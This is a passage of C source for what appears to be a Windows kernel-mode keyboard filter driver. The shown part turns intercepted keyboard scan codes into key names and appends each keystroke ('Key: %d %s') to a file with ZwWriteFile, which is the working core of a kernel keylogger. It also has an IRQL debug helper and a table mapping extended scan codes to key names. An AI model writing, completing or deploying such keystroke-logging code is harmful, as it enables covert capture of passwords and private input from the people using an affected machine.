        {
            const CHAR* key;
            if (ctx->inputData.Flags == KEY_E0)
                key = GetExtendedKey(ctx->inputData.MakeCode);
            else if (ctx->inputData.MakeCode < KEYS_MAP_SIZE)
                key = keysMap[ctx->inputData.MakeCode];
            else
                key = "[UNDEFINED]";

                
            ntstatus = RtlStringCbPrintfA(buffer,
                                          sizeof(buffer),
                                          "Key: %d %s \r\n",
                                          ctx->inputData.MakeCode,
                                          key);

            if (NT_SUCCESS(ntstatus))
            {
                ntstatus = RtlStringCbLengthA(buffer, sizeof(buffer), &cb);

                if (NT_SUCCESS(ntstatus))
                {
                    ntstatus = ZwWriteFile(handle, 
                                           NULL, 
                                           NULL, 
                                           NULL, 
                                           &ioStatusBlock,
                                           buffer, 
                                           (ULONG)cb, 
                                           NULL, 
                                           NULL);
                }
            }

            ZwClose(handle);
        }

    } 

    IoFreeWorkItem(ctx->worker);
    ExFreePoolWithTag(ctx, 'ctx');
}

VOID
PrintIRQL()
{
    KIRQL level = KeGetCurrentIrql();

    if (level == PASSIVE_LEVEL)
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Current IRQL: %d (PASSIVE_LEVEL)\n", level);
    else if (level == APC_LEVEL)
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Current IRQL: %d (APC_LEVEL)\n", level);
    else if (level == DISPATCH_LEVEL)
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Current IRQL: %d (DISPATCH_LEVEL)\n", level);
}

CHAR*
GetExtendedKey(
    USHORT scanCode
)
{
    switch (scanCode)
    {
        case 28:
            return "[NUM_ENTER]";
        case 53:
            return "/";
        case 55:
            return "[PrtSc]";
        case 56:
            return "[ALT]";
        case 71:
            return "[Home]";
        case 72:
            return "[Up_Arrow]";
        case 73:
            return "[PageUp]";
        case 75:
            return "[Left_Arrow]";
        case 77:
            return "[Right_Arrow]";
        case 79:
            return "[End]";
        case 80:
            return "[Down_Arrow]";
        case 81:
            return "[PageDown]";
        case 82:
            return "[INSERT]";
        case 83:
            return "[DELETE]";
        case 91:
            return "[WIN]";
        case 93:
            return "[MENU]";
        default:
            return "[UNDEFINED]";

    }
}